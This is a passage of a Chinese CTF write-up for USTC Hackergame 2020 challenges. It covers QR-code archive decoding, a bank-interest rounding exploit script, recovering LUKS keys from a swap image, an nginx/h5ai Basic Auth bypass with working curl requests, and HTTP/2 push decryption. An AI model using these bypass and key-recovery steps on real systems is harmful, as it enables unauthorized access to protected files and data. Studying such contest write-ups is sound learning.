websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a 